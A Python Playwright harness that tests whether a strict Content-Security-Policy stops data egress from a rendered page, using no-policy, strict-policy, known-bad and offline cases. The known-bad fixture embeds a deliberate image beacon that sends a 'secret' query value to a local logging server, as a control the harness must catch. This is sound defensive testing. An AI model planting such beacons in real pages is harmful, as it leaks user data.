"""Phase 4: zero-egress proof, built to fail.

Asserting an absence is the vacuous-pass case: a request counter reading zero looks
identical whether the guard works or the counter is broken. So this harness is judged by
whether it can CATCH a request, and that is tested explicitly rather than assumed.

Four parts, all required:

  1. `no-csp control`   -- the same vectors with NO CSP. Any vector the browser permits
                           MUST be observed. This proves the harness can see egress at
                           all, and it is run FIRST: if it observes nothing, every later
                           zero is meaningless and the run aborts.
  2. `strict CSP`       -- the production policy. Every vector attempted; assert the
                           server received nothing and the CDP request count is zero.
  3. `known-bad build`  -- a page carrying the strict CSP but ALSO one deliberately
                           permitted beacon. The harness must catch it. Without this the
                           zero-egress claim is unfalsifiable.
  4. `severed network`  -- all routes aborted; confirm the page still WORKS. This is the
                           inert form: if the build needed the network it fails closed
                           rather than leaking.

Observation is at the NETWORK layer (the logging server plus CDP request events), never
at the JS layer. Under CSP most vectors report `attempted` with no exception and simply
produce no request, so a probe keyed on thrown errors would report exfiltration as
succeeding.

Run (the server is started and stopped by this script):
  .venv/bin/python docs/research/pdf-backend-bakeoff/probes/phase4_egress.py \
      --out docs/research/pdf-backend-bakeoff/results/phase4.json
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import threading
import time
from pathlib import Path

PROBES = Path(__file__).resolve().parent
REPO = PROBES.parents[3]

PORT = 8973
SETTLE_S = 4.0

STRICT_CSP = (
    "default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'unsafe-inline'; "
    "img-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'; "
    "object-src 'none'; frame-src 'none'; worker-src 'none'"
)

PAGE = """<!doctype html><meta charset="utf-8"><title>{title}</title>
{csp}
<body><pre id="o">running</pre>
<script src="vectors.js"></script>
{extra}
<script>window.__tryAll("{tag}").then(r=>{{document.getElementById("o").textContent=r+"\\nDONE";}});</script>
"""

# The known-bad control's deliberate leak. It sits INSIDE the strict-CSP page, so the
# only thing distinguishing it from part 2 is one permitted destination -- which is
# exactly the discrimination the harness must be able to make.
KNOWN_BAD_EXTRA = f"""<script>
  // Deliberate egress: an image beacon to a host the CSP below explicitly allows.
  var i = new Image();
  i.src = "http://127.0.0.1:{PORT}/knownbad-beacon?secret=BILLTEXT";
  document.body.appendChild(i);
</script>"""
KNOWN_BAD_CSP = (
    f'<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; '
    f"script-src 'self' 'unsafe-inline'; style-src 'unsafe-inline'; "
    f"img-src data: http://127.0.0.1:{PORT}; connect-src 'none'; form-action 'none'; "
    f"base-uri 'none'; object-src 'none'\">"
)


class Server:
    """The logging server, run as a subprocess so its listeners are really separate."""

    def __init__(self, dump: Path):
        self.dump = dump
        self.proc: subprocess.Popen | None = None
        self.lines: list[str] = []

    def __enter__(self):
        self.proc = subprocess.Popen(
            [sys.executable, str(PROBES / "serve.py"), "--port", str(PORT), "--seconds", "600"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        threading.Thread(target=self._drain, daemon=True).start()
        for _ in range(50):
            if any("listening" in ln for ln in self.lines):
                return self
            time.sleep(0.1)
        raise RuntimeError("logging server did not start")

    def _drain(self):
        assert self.proc and self.proc.stdout
        for line in self.proc.stdout:
            self.lines.append(line.rstrip())

    def __exit__(self, *_exc):
        if self.proc:
            self.proc.terminate()
            self.proc.wait(timeout=10)

    def observed_since(self, mark: int) -> list[str]:
        return [ln.strip() for ln in self.lines[mark:] if "EGRESS OBSERVED" in ln]

    @property
    def mark(self) -> int:
        return len(self.lines)


def write_page(path: Path, title: str, tag: str, csp: str, extra: str = "") -> None:
    path.write_text(PAGE.format(title=title, tag=tag, csp=csp, extra=extra))


def run_case(browser, server: Server, page_path: Path, tag: str, offline: bool = False) -> dict:
    """Load one fixture from file://, run every vector, report page + network views."""
    context = browser.new_context()
    cdp_requests: list[str] = []
    context.on("request", lambda r: cdp_requests.append(f"{r.method} {r.url}"))
    if offline:
        # Sever the NETWORK, not the filesystem. Aborting `**` also kills the fixture's
        # own file:// load, so the page never runs and the test passes for the wrong
        # reason -- it would report "no egress" from a page that never executed. Only
        # network schemes are aborted; reading the local artifact off disk is not egress.
        context.route(
            lambda url: url.startswith(("http://", "https://", "ws://", "wss://")),
            lambda route: route.abort(),
        )
    page = context.new_page()
    mark = server.mark
    page.goto(page_path.as_uri())
    # Polled from Python rather than with `page.wait_for_function`. Playwright's polling
    # helper compiles a function in the page, which needs `unsafe-eval`; the strict CSP
    # denies it, so wait_for_function times out on a page that in fact ran every vector
    # to completion. That failure mode is dangerous rather than merely annoying: it makes
    # a fully-executed run look stalled, and a stalled run's zero hits look like a pass.
    page_report = "<never rendered>"
    deadline = time.time() + 30
    while time.time() < deadline:
        try:
            page_report = page.eval_on_selector("#o", "e => e.textContent")
        except Exception:  # noqa: BLE001 - element not present yet
            page_report = "<never rendered>"
        if "DONE" in page_report:
            break
        time.sleep(0.25)
    time.sleep(SETTLE_S)  # let late loads (webfont, worker, STUN) arrive
    context.close()

    # Requests aimed at the logging host, as seen by CDP. file:// asset loads for the
    # fixture itself are not egress and are excluded by host.
    external = [r for r in cdp_requests if f"127.0.0.1:{PORT}" in r]
    observed = server.observed_since(mark)
    return {
        "tag": tag,
        # What the SERVER received. This alone decides the claim.
        "server_observed": observed,
        "server_http_hits": [ln for ln in observed if "[http]" in ln],
        "server_stun_hits": [ln for ln in observed if "[stun]" in ln or "[udp]" in ln],
        # What CDP saw the browser CREATE. A request object exists before CSP rules on
        # it, so these are ATTEMPTS, not egress: under the strict policy this list is
        # non-empty while the server receives nothing. Reported to keep the distinction
        # visible rather than to prove anything.
        "cdp_attempted_requests": external,
        "page_report": page_report,
        # Fail closed: a run that did not finish proves nothing, and its zero hits must
        # never be read as a pass.
        "vectors_completed": "DONE" in page_report,
        "n_vectors_run": page_report.count(":attempted") + page_report.count(":threw"),
    }


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", type=Path, required=True)
    args = ap.parse_args()

    from playwright.sync_api import sync_playwright

    fixtures = PROBES / "egress-fixtures"
    fixtures.mkdir(exist_ok=True)
    (fixtures / "vectors.js").write_text((PROBES / "vectors.js").read_text())

    write_page(fixtures / "nocsp.html", "no CSP", "nocsp", "")
    write_page(
        fixtures / "withcsp.html",
        "strict CSP",
        "withcsp",
        f'<meta http-equiv="Content-Security-Policy" content="{STRICT_CSP}">',
    )
    write_page(fixtures / "knownbad.html", "known-bad control", "knownbad", KNOWN_BAD_CSP, KNOWN_BAD_EXTRA)

    results: dict = {"port": PORT, "strict_csp": STRICT_CSP, "cases": {}}
    args.out.parent.mkdir(parents=True, exist_ok=True)

    with Server(fixtures / "hits.json") as server, sync_playwright() as pw:
        browser = pw.chromium.launch()
        try:
            # PART 1 -- prove the harness can see egress at all, before trusting any zero.
            control = run_case(browser, server, fixtures / "nocsp.html", "nocsp")
            results["cases"]["1_no_csp_control"] = control
            print(
                f"1. no-CSP control: {len(control['server_http_hits'])} http + "
                f"{len(control['server_stun_hits'])} stun at server; "
                f"{control['n_vectors_run']} vectors ran (completed={control['vectors_completed']})",
                flush=True,
            )
            if not control["server_observed"]:
                results["ABORTED"] = (
                    "The no-CSP control observed ZERO egress. The harness cannot see a "
                    "request, so every later zero would be vacuous. Nothing below is "
                    "evidence of anything."
                )
                args.out.write_text(json.dumps(results, indent=1))
                print(results["ABORTED"], file=sys.stderr)
                return

            # PART 2 -- the production policy.
            strict = run_case(browser, server, fixtures / "withcsp.html", "withcsp")
            results["cases"]["2_strict_csp"] = strict
            print(
                f"2. strict CSP:     {len(strict['server_http_hits'])} http + "
                f"{len(strict['server_stun_hits'])} stun at server; "
                f"{strict['n_vectors_run']} vectors ran (completed={strict['vectors_completed']}); "
                f"{len(strict['cdp_attempted_requests'])} attempts created but blocked",
                flush=True,
            )

            # PART 3 -- known-bad control. The harness MUST catch this one.
            bad = run_case(browser, server, fixtures / "knownbad.html", "knownbad")
            results["cases"]["3_known_bad"] = bad
            caught = any("knownbad-beacon" in ln for ln in bad["server_observed"])
            results["known_bad_caught"] = caught
            print(
                f"3. known-bad:      {len(bad['server_http_hits'])} http at server; "
                f"deliberate beacon caught = {caught}",
                flush=True,
            )

            # PART 4 -- severed network. The page must still complete.
            offline = run_case(browser, server, fixtures / "withcsp.html", "offline", offline=True)
            results["cases"]["4_severed_network"] = offline
            print(
                f"4. severed net:    page completed = {offline['vectors_completed']} "
                f"({offline['n_vectors_run']} vectors); "
                f"{len(offline['server_http_hits'])} http at server",
                flush=True,
            )
        finally:
            browser.close()

    strict_case = results["cases"].get("2_strict_csp", {})
    control_case = results["cases"]["1_no_csp_control"]
    results["verdict"] = {
        # The harness is only trustworthy if it has been SEEN to catch a request, twice:
        # once with no policy at all, once with a policy plus a deliberate leak.
        "harness_can_detect_egress": bool(control_case["server_http_hits"]),
        "harness_can_detect_udp": bool(control_case["server_stun_hits"]),
        "known_bad_caught": results.get("known_bad_caught", False),
        # Fail closed: a run that did not execute its vectors proves nothing, and its
        # zero hits must never be read as a pass.
        "strict_run_completed": strict_case.get("vectors_completed", False),
        "strict_vectors_run": strict_case.get("n_vectors_run", 0),
        "strict_csp_http_hits": len(strict_case.get("server_http_hits", [])),
        "strict_csp_udp_hits": len(strict_case.get("server_stun_hits", [])),
        "offline_run_completed": results["cases"]
        .get("4_severed_network", {})
        .get("vectors_completed", False),
        # The claim, scoped to what CSP actually governs.
        "csp_blocks_every_subresource_vector": bool(
            strict_case.get("vectors_completed") and not strict_case.get("server_http_hits")
        ),
        # ... and the channel it does NOT govern, named rather than omitted.
        "webrtc_egress_survives_csp": bool(strict_case.get("server_stun_hits")),
    }
    results["verdict"]["zero_egress_claim_earned"] = bool(
        results["verdict"]["harness_can_detect_egress"]
        and results["verdict"]["known_bad_caught"]
        and results["verdict"]["strict_run_completed"]
        and results["verdict"]["csp_blocks_every_subresource_vector"]
    )
    args.out.write_text(json.dumps(results, indent=1))
    print(json.dumps(results["verdict"], indent=1), flush=True)


if __name__ == "__main__":
    main()
